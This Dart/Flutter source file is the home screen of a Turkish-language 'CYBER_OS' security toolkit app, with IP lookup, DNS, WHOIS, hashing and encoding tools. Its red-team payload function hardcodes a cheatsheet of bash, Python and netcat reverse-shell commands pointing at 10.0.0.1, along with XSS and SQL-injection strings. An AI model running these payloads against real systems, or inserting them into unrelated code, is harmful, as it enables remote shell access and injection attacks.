import 'dart:convert';
import 'dart:io';
import 'package:crypto/crypto.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:intl/intl.dart';
import 'package:percent_indicator/circular_percent_indicator.dart';
import '../providers/ip_provider.dart';
import '../models/ip_data.dart';
import '../services/api_service.dart';

class HomeScreen extends ConsumerStatefulWidget {
  const HomeScreen({super.key});

  @override
  ConsumerState<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends ConsumerState<HomeScreen> {
  int _selectedIndex = 0;
  final TextEditingController _controller = TextEditingController();
  String _searchIp = "";


  final Color _bg = const Color(0xFF000000);
  final Color _surface = const Color(0xFF111111);
  final Color _accent = const Color(0xFF00F0FF);
  final Color _danger = const Color(0xFFFF003C); 
  final Color _success = const Color(0xFF00FF41); 
  final Color _warn = const Color(0xFFFFD700); 
  final Color _textSec = const Color(0xFF888888);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bg,
      appBar: _buildAppBar(),
      body: SelectionArea(child: SafeArea(child: _buildBody())),
      bottomNavigationBar: _buildBottomNav(),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: _bg, elevation: 0,
      title: Row(children: [
          Icon(Icons.shield_moon, color: _accent, size: 24), const SizedBox(width: 12),
          Text("CYBER_OS", style: GoogleFonts.audiowide(color: Colors.white, fontSize: 20, letterSpacing: 1.5)),
          Container(margin:const EdgeInsets.only(left:8), padding:const EdgeInsets.symmetric(horizontal:6,vertical:2), decoration:BoxDecoration(color:_danger, borderRadius:BorderRadius.circular(4)), child:Text("PRO", style:GoogleFonts.robotoMono(fontSize:10, fontWeight:FontWeight.bold, color:Colors.black)))
      ]),
      actions: [
        if (_selectedIndex == 0) Consumer(builder: (context, ref, _) {
            final ipDataAsync = ref.watch(ipDataProvider(_searchIp));
            return ipDataAsync.maybeWhen(data: (data) => data != null ? IconButton(icon: const Icon(Icons.copy_all, color: Colors.white), tooltip: "Raporu Kopyala", onPressed: () {
                  Clipboard.setData(ClipboardData(text: data.getFormattedReport()));
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("İstihbarat Raporu Kopyalandı", style: GoogleFonts.robotoMono()), backgroundColor: _surface));
            }) : const SizedBox(), orElse: () => const SizedBox());
        })
      ],
    );
  }

  Widget _buildBody() {
    switch (_selectedIndex) {
      case 0: return _buildDashboardBody();
      case 1: return _buildArsenalView();
      case 2: return _buildHistoryView();
      default: return _buildDashboardBody();
    }
  }

  // DASHBOARD
  Widget _buildDashboardBody() {
    final ipDataAsync = ref.watch(ipDataProvider(_searchIp));
    return Column(children: [
        _buildSearchBar(),
        Expanded(child: ipDataAsync.when(
            loading: () => Center(child: CircularProgressIndicator(color: _accent)),
            error: (err, stack) => Center(child: Text("Bağlantı Hatası", style: TextStyle(color: _danger))),
            data: (data) {
              if (data == null) return _buildEmptyState();
              return ListView(padding: const EdgeInsets.all(20), physics: const BouncingScrollPhysics(), children: [
                  _buildRiskCard(data), const SizedBox(height: 20),
                  _buildNetworkBadges(data), const SizedBox(height: 20),
                  _buildDetailsSection(data), const SizedBox(height: 20),
                  _buildPortsSection(data), const SizedBox(height: 20),
                  if (data.httpHeaders.isNotEmpty) _buildHeadersTerminal(data),
              ]);
            }
        )),
    ]);
  }

  // UI
  Widget _buildArsenalView() {
    return ListView(
      padding: const EdgeInsets.all(20),
      children: [
        _sectionHeader("RECONNAISSANCE"),
        _toolTile(Icons.domain, "WHOIS Lookup", "Domain Tescil Bilgileri", _accent, () => _showWhoisTool()),
        _toolTile(Icons.dns, "DNS Dumper", "DNS Kayıt Analizi", _accent, () => _showDnsTool()),
        _toolTile(Icons.travel_explore, "Subdomain Finder", "crt.sh Veritabanı", _accent, () => _showSubdomainTool()),
        
        const SizedBox(height: 20),
        _sectionHeader("NETWORK OPERATIONS"),
        _toolTile(Icons.public, "My Public IP", "IP Adresim Nedir?", _danger, () => _showMyIpTool()),
        _toolTile(Icons.speed, "Latency Tester", "TCP Bağlantı Hızı", _danger, () => _showPingTool()),
        _toolTile(Icons.grid_4x4, "Subnet Calc", "CIDR Hesaplayıcı", _danger, () => _showSubnetTool()),
        _toolTile(Icons.wifi_find, "MAC Vendor", "Cihaz Üreticisi", _danger, () => _showMacTool()),
        _toolTile(Icons.info, "Device Info", "Sistem Bilgileri", _danger, () => _showSystemInfoTool()),

        const SizedBox(height: 20),
        _sectionHeader("RED TEAM"),
        _toolTile(Icons.code, "Reverse Shells", "Payload Generator", _success, () => _showPayloadTool("RevShell")),
        _toolTile(Icons.bug_report, "XSS Payload", "Cross-Site Scripting", _success, () => _showPayloadTool("XSS")),
        _toolTile(Icons.storage, "SQLi Payload", "SQL Injection", _success, () => _showPayloadTool("SQLi")),

        const SizedBox(height: 20),
        _sectionHeader("CRYPTOGRAPHY"),
        _toolTile(Icons.token, "JWT Decoder", "Token Analizi", Colors.purpleAccent, () => _showJwtTool()),
        _toolTile(Icons.lock_open, "Base64 Tool", "Encode/Decode", Colors.purpleAccent, () => _showBase64Tool()),
        _toolTile(Icons.data_array, "Hex/Bin Converter", "Format Çevirici", Colors.purpleAccent, () => _showConverterTool()),
        _toolTile(Icons.fingerprint, "Hash Generator", "MD5 & SHA256", Colors.purpleAccent, () => _showHashTool()),
        _toolTile(Icons.password, "Pass Strength", "Zorluk Analizi", Colors.purpleAccent, () => _showPassStrengthTool()),
        _toolTile(Icons.access_time, "Unix Converter", "Zaman Damgası", Colors.purpleAccent, () => _showUnixTool()),
        _toolTile(Icons.rotate_right, "ROT13 Cipher", "Basit Şifreleme", Colors.purpleAccent, () => _showRot13Tool()),
      ],
    );
  }

  Widget _sectionHeader(String title) {
    return Padding(padding: const EdgeInsets.only(bottom: 12, left: 4), child: Text(title, style: GoogleFonts.audiowide(color: _textSec, fontSize: 12, letterSpacing: 1)));
  }

  Widget _toolTile(IconData icon, String title, String sub, Color color, VoidCallback onTap) {
    return Container(
      margin: const EdgeInsets.only(bottom: 10),
      decoration: BoxDecoration(
        color: _surface,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: Colors.white.withOpacity(0.05)),
        boxShadow: [BoxShadow(color: Colors.black, blurRadius: 5, offset: const Offset(0, 4))]
      ),
      child: Material(
        color: Colors.transparent,
        child: InkWell(
          borderRadius: BorderRadius.circular(10),
          onTap: onTap,
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            child: Row(
              children: [
                Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(8)), child: Icon(icon, color: color, size: 24)),
                const SizedBox(width: 15),
                Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    Text(title, style: GoogleFonts.robotoMono(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14)),
                    const SizedBox(height: 2),
                    Text(sub, style: GoogleFonts.robotoMono(color: _textSec, fontSize: 10))
                ])),
                Icon(Icons.chevron_right, color: Colors.grey[800], size: 18),
              ],
            ),
          ),
        ),
      ),
    );
  }


  // My IP
  void _showMyIpTool() {
     _showModal("MY PUBLIC IP", FutureBuilder<String>(
       future: ApiService().getMyIp(),
       builder: (ctx, snap) {
         if(!snap.hasData) return const Center(child: CircularProgressIndicator());
         String ip = snap.data!;
         return Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
           Icon(Icons.public, size: 80, color: _danger), const SizedBox(height: 20),
           InkWell(
             onTap: () {
               Clipboard.setData(ClipboardData(text: ip));
               ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("IP Adresi Kopyalandı")));
             },
             child: Container(
               padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
               decoration: BoxDecoration(color: _surface, borderRadius: BorderRadius.circular(8), border: Border.all(color: _danger)),
               child: Row(mainAxisSize: MainAxisSize.min, children: [
                 Text(ip, style: GoogleFonts.audiowide(fontSize: 28, color: Colors.white)),
                 const SizedBox(width: 10),
                 const Icon(Icons.copy, color: Colors.grey, size: 18)
               ]),
             ),
           ),
           const SizedBox(height: 10),
           Text("Tıklayarak Kopyala", style: TextStyle(color: _textSec))
         ]));
       }
     ));
  }

  // Ping Tool TCP
  void _showPingTool() {
    final c = TextEditingController(); String r = "";
    _showModal("LATENCY TESTER", StatefulBuilder(builder: (ctx, setS) => Column(children: [
        _input(c, "domain.com (Örn: google.com)"),
        _btn("BAĞLANTIYI TEST ET", () async { 
           if(c.text.isEmpty) return;
           setS(()=>r="Bağlanıyor..."); 
           var x = await ApiService().pingHost(c.text); 
           setS(()=>r=x); 
        }, color: _danger),
        const SizedBox(height: 30),
        Center(child: Text(r, style: GoogleFonts.audiowide(fontSize: 40, color: _success)))
    ])));
  }

  // Subnet Calc
  void _showSubnetTool() {
     final c = TextEditingController(); String r = "";
     _showModal("SUBNET CALC", StatefulBuilder(builder: (ctx, setS) => Column(children: [
        _input(c, "IP (Örn: 192.168.1.5)"), const SizedBox(height:10),
        _btn("HESAPLA (/24 Default)", () {
           String ip = c.text; 
           if(ip.isEmpty) { setS(()=>r="IP Giriniz"); return; }
           List<String> parts = ip.split('.');
           if(parts.length != 4) { setS(()=>r="Geçersiz IPv4"); return; }
           setS(()=>r="CIDR: /24 (Class C)\nNetmask: 255.255.255.0\nNetwork: ${parts[0]}.${parts[1]}.${parts[2]}.0\nBroadcast: ${parts[0]}.${parts[1]}.${parts[2]}.255\nUsable IPs: 254");
        }, color: _danger), _output(r)
     ])));
  }
  
  // Payloads
  void _showPayloadTool(String type) {
    String content = "";
    if(type=="RevShell") content = "Bash:\nbash -i >& /dev/tcp/10.0.0.1/8080 0>&1\n\nPython:\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\nNetcat:\nnc -e /bin/sh 10.0.0.1 1234";
    if(type=="XSS") content = "<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\njavascript:alert(1)";
    if(type=="SQLi") content = "' OR '1'='1\n' OR 1=1--\nadmin' --\n' UNION SELECT 1,2,3--";
    _showModal("$type CHEATSHEET", SingleChildScrollView(child: SelectableText(content, style: GoogleFonts.robotoMono(color: _warn, fontSize: 13))));
  }

  // Diğer Araçlar (Whois, DNS, vb.) 
  void _showWhoisTool() { final c = TextEditingController(); String r = ""; _showModal("WHOIS LOOKUP", StatefulBuilder(builder: (ctx, setS) => Column(children: [_input(c, "domain.com"), _btn("SORGULA", () async { setS(()=>r="..."); var x = await ApiService().fetchWhois(c.text); setS(()=>r=x); }), _output(r)]))); }
  void _showDnsTool() { final c = TextEditingController(); List<String> r = []; _showModal("DNS DUMPER", StatefulBuilder(builder: (ctx, setS) => Column(children: [_input(c, "domain.com"), _btn("KAYITLARI GETİR", () async { setS(()=>r=["Sorgulanıyor..."]); var x = await ApiService().fetchDnsRecords(c.text); setS(()=>r=x); }), Expanded(child: ListView(children: r.map((e)=>Text(e, style:GoogleFonts.robotoMono(color:Colors.white))).toList()))]))); }
  void _showSubdomainTool() { final c = TextEditingController(); List<String> r = []; _showModal("SUBDOMAIN FINDER", StatefulBuilder(builder: (ctx, setS) => Column(children: [_input(c, "google.com"), _btn("TARAMAYI BAŞLAT", () async { setS(()=>r=["Certificate Logs taranıyor..."]); var x = await ApiService().fetchSubdomains(c.text); setS(()=>r=x); }), Expanded(child: ListView.builder(itemCount:r.length, itemBuilder:(c,i)=>Text("• ${r[i]}", style:GoogleFonts.robotoMono(color:_success))))]))); }
  void _showMacTool() { final c = TextEditingController(); String r = ""; _showModal("MAC VENDOR", StatefulBuilder(builder: (ctx, setS) => Column(children: [_input(c, "00:1B:44:11:3A:B7"), _btn("BUL", () async { setS(()=>r="..."); var x = await ApiService().fetchMacVendor(c.text); setS(()=>r=x); }), _output(r)]))); }
  void _showSystemInfoTool() { String os = Platform.operatingSystem; String ver = Platform.operatingSystemVersion; String cores = Platform.numberOfProcessors.toString(); _showModal("SYSTEM INFO", Center(child: Text("OS: $os\nVERSION: $ver\nCORES: $cores\nLOCALE: ${Platform.localeName}", style: GoogleFonts.robotoMono(color: _success, fontSize: 16), textAlign: TextAlign.center))); }
  void _showJwtTool() { final c = TextEditingController(); String r = ""; _showModal("JWT DECODER", StatefulBuilder(builder: (ctx, setS) => Column(children: [ _input(c, "JWT Token..."), _btn("DECODE", () { try { List<String> parts = c.text.split('.'); if(parts.length != 3) throw Exception("Geçersiz JWT"); String payload = parts[1]; while(payload.length % 4 != 0) { payload += '='; } String decoded = utf8.decode(base64Url.decode(payload)); setS(() => r = "PAYLOAD:\n$decoded"); } catch(e) { setS(() => r = "Hata: Geçersiz Token formatı."); } }), _output(r) ]))); }
  void _showBase64Tool() { final c = TextEditingController(); String r = ""; _showModal("BASE64 TOOL", StatefulBuilder(builder: (ctx, setS) => Column(children: [_input(c, "Metin..."), Row(children: [Expanded(child: _btn("ENCODE", () { try { setS(() => r = base64.encode(utf8.encode(c.text))); } catch(e){ setS(()=>r="Hata"); } })), const SizedBox(width: 10), Expanded(child: _btn("DECODE", () { try { setS(() => r = utf8.decode(base64.decode(c.text))); } catch(e){ setS(()=>r="Geçersiz Base64"); } }, color: _danger))]), _output(r)]))); }
  void _showConverterTool() { final c = TextEditingController(); String r = ""; _showModal("CONVERTER", StatefulBuilder(builder: (ctx, setS) => Column(children: [ _input(c, "Metin..."), Row(children: [ Expanded(child: _btn("TO HEX", () { setS(() => r = c.text.codeUnits.map((e)=>e.toRadixString(16)).join(' ')); })), const SizedBox(width: 5), Expanded(child: _btn("TO BIN", () { setS(() => r = c.text.codeUnits.map((e)=>e.toRadixString(2).padLeft(8,'0')).join(' ')); })), ]), _output(r) ]))); }
  void _showHashTool() { final c = TextEditingController(); String md5r = "", sha256r = ""; _showModal("HASH GENERATOR", StatefulBuilder(builder: (ctx, setS) => Column(children: [_input(c, "Metin..."), _btn("OLUŞTUR", () { var bytes = utf8.encode(c.text); setS(() { md5r = md5.convert(bytes).toString(); sha256r = sha256.convert(bytes).toString(); }); }), const SizedBox(height: 20), if(md5r.isNotEmpty) Column(crossAxisAlignment:CrossAxisAlignment.start, children:[Text("MD5:", style:TextStyle(color:_accent)), SelectableText(md5r, style:GoogleFonts.robotoMono(color:Colors.white)), const SizedBox(height: 10), Text("SHA256:", style:TextStyle(color:_accent)), SelectableText(sha256r, style:GoogleFonts.robotoMono(color:Colors.white))])]))); }
  void _showPassStrengthTool() { final c = TextEditingController(); String r = ""; Color col = Colors.grey; _showModal("PASSWORD CHECK", StatefulBuilder(builder: (ctx, setS) => Column(children: [ TextField(controller: c, style:const TextStyle(color:Colors.white), decoration:InputDecoration(filled:true, fillColor:_surface), onChanged:(v){ int score=0; if(v.length>8) score++; if(v.contains(RegExp(r'[A-Z]'))) score++; if(v.contains(RegExp(r'[0-9]'))) score++; if(v.contains(RegExp(r'[!@#\$&*~]'))) score++; setS((){ if(score<2) {r="ZAYIF"; col=_danger;} else if(score<4) {r="ORTA"; col=Colors.orange;} else {r="GÜÇLÜ"; col=_success;} }); }), const SizedBox(height:30), Text(r, style:GoogleFonts.orbitron(fontSize:30, color:col, fontWeight:FontWeight.bold)) ]))); }
  void _showUnixTool() { final c = TextEditingController(); String r = ""; _showModal("UNIX TIME", StatefulBuilder(builder: (ctx, setS) => Column(children: [ _input(c, "Timestamp (örn: 1672531200)"), _btn("ÇEVİR", () { try { int ts = int.parse(c.text); var date = DateTime.fromMillisecondsSinceEpoch(ts * 1000); setS(() => r = DateFormat('dd.MM.yyyy HH:mm:ss').format(date)); } catch(e) { setS(() => r = "Geçersiz Timestamp"); } }), _output(r) ]))); }
  void _showRot13Tool() { final c = TextEditingController(); String r = ""; _showModal("ROT13 CIPHER", StatefulBuilder(builder: (ctx, setS) => Column(children: [ _input(c, "Metin..."), _btn("UYGULA", () { var input = c.text; var output = ""; for (int i = 0; i < input.length; i++) { int charCode = input.codeUnitAt(i); if ((charCode >= 65 && charCode <= 90)) { output += String.fromCharCode(((charCode - 65 + 13) % 26) + 65); } else if ((charCode >= 97 && charCode <= 122)) { output += String.fromCharCode(((charCode - 97 + 13) % 26) + 97); } else { output += input[i]; } } setS(() => r = output); }), _output(r) ]))); }

  //UI YARDIMCILARI
  void _showModal(String title, Widget content) { showModalBottomSheet(context: context, isScrollControlled: true, backgroundColor: _bg, builder: (ctx) => Container(height: MediaQuery.of(context).size.height * 0.75, padding: const EdgeInsets.all(20), decoration: BoxDecoration(color: _bg, border: Border(top: BorderSide(color: _accent.withOpacity(0.3), width: 1)), borderRadius: const BorderRadius.vertical(top: Radius.circular(20))), child: Column(children: [Container(width: 40, height: 4, decoration: BoxDecoration(color: Colors.grey[800], borderRadius: BorderRadius.circular(2))), const SizedBox(height: 20), Text(title, style: GoogleFonts.audiowide(color: _accent, fontSize: 20)), const SizedBox(height: 20), Expanded(child: content)]))); }
  Widget _input(TextEditingController c, String h) => TextField(controller: c, style:const TextStyle(color:Colors.white), decoration:InputDecoration(hintText:h, hintStyle:TextStyle(color:Colors.grey), filled:true, fillColor:const Color(0xFF222222), border:OutlineInputBorder(borderRadius:BorderRadius.circular(8), borderSide: BorderSide.none)));
  Widget _btn(String t, VoidCallback p, {Color? color}) => Padding(padding:const EdgeInsets.symmetric(vertical:10), child:ElevatedButton(style:ElevatedButton.styleFrom(backgroundColor: color ?? _accent, minimumSize:const Size(double.infinity,45)), onPressed:p, child:Text(t, style:const TextStyle(color:Colors.black, fontWeight:FontWeight.bold))));
  Widget _output(String t) => Expanded(child:Container(width:double.infinity, margin:const EdgeInsets.only(top:10), padding:const EdgeInsets.all(10), decoration:BoxDecoration(color:Colors.black, borderRadius:BorderRadius.circular(8)), child:SingleChildScrollView(child:SelectableText(t, style:GoogleFonts.robotoMono(color:_success)))));
  
  // DASHBOARD WIDGETS
  Widget _buildSearchBar() { return Container(padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10), color: _bg, child: TextField(controller: _controller, style: GoogleFonts.robotoMono(color: Colors.white), decoration: InputDecoration(hintText: "IP/Domain...", hintStyle: GoogleFonts.robotoMono(color: _textSec), filled: true, fillColor: _surface, prefixIcon: Icon(Icons.search, color: _accent), suffixIcon: IconButton(icon: Icon(Icons.clear, color: _textSec), onPressed: () => _controller.clear()), border: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: BorderSide.none)), onSubmitted: (v) { FocusScope.of(context).unfocus(); if(v.isNotEmpty) setState(() { _searchIp = v.trim(); }); })); }
  Widget _buildRiskCard(IpData data) { bool isHigh = data.riskScore > 50; return Container(padding: const EdgeInsets.all(20), decoration: BoxDecoration(gradient: LinearGradient(colors: [isHigh ? _danger.withOpacity(0.2) : _accent.withOpacity(0.2), _surface]), borderRadius: BorderRadius.circular(12), border: Border.all(color: isHigh ? _danger.withOpacity(0.5) : _accent.withOpacity(0.3))), child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [Column(crossAxisAlignment: CrossAxisAlignment.start, children: [Text("TEHDİT PUANI", style: GoogleFonts.robotoMono(color: _textSec, fontSize: 11)), Text(isHigh ? "YÜKSEK" : "GÜVENLİ", style: GoogleFonts.audiowide(color: isHigh ? _danger : _success, fontSize: 24))]), CircularPercentIndicator(radius: 40.0, lineWidth: 8.0, percent: data.riskScore / 100, center: Text("${data.riskScore}", style: GoogleFonts.robotoMono(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 18)), progressColor: isHigh ? _danger : _success, backgroundColor: Colors.black26)])); }
  Widget _buildNetworkBadges(IpData data) => Row(children: [if(data.isProxy) Expanded(child: _badge("VPN", _danger)), if(data.isHosting) Expanded(child: _badge("HOST", Colors.orange)), if(data.isMobile) Expanded(child: _badge("MOBIL", _success))]);
  Widget _badge(String t, Color c) => Container(alignment:Alignment.center, margin:const EdgeInsets.only(right:5), padding:const EdgeInsets.all(8), decoration:BoxDecoration(color:c.withOpacity(0.1), border:Border.all(color:c), borderRadius:BorderRadius.circular(5)), child:Text(t, style:GoogleFonts.robotoMono(color:c, fontSize:10, fontWeight:FontWeight.bold)));
  Widget _buildDetailsSection(IpData data) => Container(decoration: BoxDecoration(color: _surface, borderRadius: BorderRadius.circular(12)), child: Column(children: [_row("IP", data.ip), _row("Lokasyon", "${data.country}, ${data.city}"), _row("ISP", data.isp), _row("Org", data.org)]));
  Widget _row(String k, String v) => Padding(padding:const EdgeInsets.all(12), child:Row(mainAxisAlignment:MainAxisAlignment.spaceBetween, children:[Text(k, style:TextStyle(color:_textSec)), Flexible(child:Text(v, style:GoogleFonts.robotoMono(color:Colors.white), textAlign:TextAlign.end))]));
  Widget _buildPortsSection(IpData data) { if(data.openPorts.isEmpty) return Container(padding:const EdgeInsets.all(15), decoration:BoxDecoration(color:_success.withOpacity(0.1), borderRadius:BorderRadius.circular(10)), child:Row(children:[Icon(Icons.shield, color:_success), const SizedBox(width:10), const Text("Portlar Kapalı (Güvenli)", style:TextStyle(color:Colors.white))])); return Wrap(spacing:5, children:data.openPorts.map((p)=>Chip(label:Text(p), backgroundColor:_danger.withOpacity(0.2))).toList()); }
  Widget _buildHeadersTerminal(IpData data) => Container(width:double.infinity, padding:const EdgeInsets.all(15), decoration:BoxDecoration(color:Colors.black, borderRadius:BorderRadius.circular(5)), child:Text("SERVER: ${data.httpHeaders['server'] ?? 'Gizli'}\nTYPE: ${data.httpHeaders['content-type'] ?? 'Gizli'}", style:GoogleFonts.robotoMono(color:_success, fontSize:12)));
  Widget _buildEmptyState() => Center(child: Text("HEDEF BEKLENİYOR...", style: GoogleFonts.audiowide(color: _textSec)));
  Widget _buildHistoryView() => ValueListenableBuilder(valueListenable: Hive.box<IpData>('history').listenable(), builder: (context, Box<IpData> box, _) { if (box.isEmpty) return Center(child: Text("Kayıt yok.", style: GoogleFonts.robotoMono(color: _textSec))); final items = box.values.toList().reversed.toList(); return ListView.separated(padding: const EdgeInsets.all(16), itemCount: items.length, separatorBuilder: (_,__) => const SizedBox(height: 10), itemBuilder: (ctx, i) { final item = items[i]; return Dismissible(key: Key(item.ip), onDismissed: (d) => box.delete(item.ip), background: Container(color: _danger), child: ListTile(tileColor: _surface, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)), onTap: () => setState(() { _searchIp = item.originalQuery.isNotEmpty ? item.originalQuery : item.ip; _controller.text = _searchIp; _selectedIndex = 0; }), leading: Icon(Icons.history, color: _accent), title: Text(item.originalQuery.isNotEmpty ? item.originalQuery : item.ip, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)), subtitle: Text(DateFormat('dd.MM HH:mm').format(item.queryDate), style: TextStyle(color: _textSec)))); }); });
  Widget _buildBottomNav() { return BottomNavigationBar(backgroundColor: _bg, selectedItemColor: _accent, unselectedItemColor: _textSec, currentIndex: _selectedIndex, onTap: (i) => setState(() => _selectedIndex = i), items: const [BottomNavigationBarItem(icon: Icon(Icons.radar), label: "SCAN"), BottomNavigationBarItem(icon: Icon(Icons.grid_view), label: "ARSENAL"), BottomNavigationBarItem(icon: Icon(Icons.history), label: "LOGS")]); }
}
